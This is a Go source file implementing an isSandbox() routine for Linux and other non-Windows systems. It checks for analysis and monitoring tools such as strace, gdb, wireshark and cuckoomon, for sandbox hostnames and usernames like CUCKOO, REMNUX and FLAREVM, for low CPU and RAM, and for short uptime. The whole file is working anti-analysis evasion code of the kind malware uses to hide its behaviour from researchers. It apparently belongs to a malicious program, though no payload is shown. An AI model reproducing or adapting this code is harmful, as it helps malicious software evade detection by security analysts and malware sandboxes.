//go:build !windows

package main

import (
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// Analysis tools only (NOT VM tools like vmtoolsd, VBoxService, qemu-ga, etc.)
var sandboxProcessesLinux = []string{
	"strace", "ltrace",
	"wireshark", "tcpdump",
	"gdb",
	"cuckoomon", "dumpcap",
	"fakenet", "inetsim",
	"sysdig",
}

// Known sandbox hostname patterns
var sandboxHostnamePatterns = []string{
	"SANDBOX", "CUCKOO", "TEQUILA",
	"REMNUX", "FLAREVM", "TPMNOTIFY",
}

// Known sandbox usernames
var sandboxUsernamePatterns = []string{
	"sandbox", "cuckoo", "remnux", "malnetvm",
	"maltest",
}

func isSandbox() bool {
	if checkLinuxProcesses() {
		return true
	}
	if checkLinuxHardware() {
		return true
	}
	if checkLinuxUptime() {
		return true
	}
	if checkLinuxHostnameUsername() {
		return true
	}
	return false
}

func checkLinuxProcesses() bool {
	cmd := exec.Command("ps", "aux")
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	output := strings.ToLower(string(out))
	for _, proc := range sandboxProcessesLinux {
		if strings.Contains(output, strings.ToLower(proc)) {
			return true
		}
	}
	return false
}

func checkLinuxHardware() bool {
	// CPU cores < 2 (2H minimum)
	if runtime.NumCPU() < 2 {
		return true
	}

	// RAM < 2GB (2G minimum)
	data, err := os.ReadFile("/proc/meminfo")
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "MemTotal:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					var memKB int64
					for _, ch := range fields[1] {
						if ch >= '0' && ch <= '9' {
							memKB = memKB*10 + int64(ch-'0')
						}
					}
					if memKB < 2*1024*1024 {
						return true
					}
				}
				break
			}
		}
	}
	return false
}

func checkLinuxUptime() bool {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}
	fields := strings.Fields(string(data))
	if len(fields) < 1 {
		return false
	}
	// Parse integer part of uptime seconds
	var uptimeSec int64
	for _, ch := range fields[0] {
		if ch == '.' {
			break
		}
		if ch >= '0' && ch <= '9' {
			uptimeSec = uptimeSec*10 + int64(ch-'0')
		}
	}
	// Uptime < 30 minutes (1800 seconds)
	if uptimeSec < 1800 {
		return true
	}
	return false
}

func checkLinuxHostnameUsername() bool {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	hn := strings.ToUpper(hostname)
	un := strings.ToLower(username)

	for _, pattern := range sandboxHostnamePatterns {
		if strings.EqualFold(hn, pattern) {
			return true
		}
	}
	for _, pattern := range sandboxUsernamePatterns {
		if strings.EqualFold(un, pattern) {
			return true
		}
	}
	return false
}
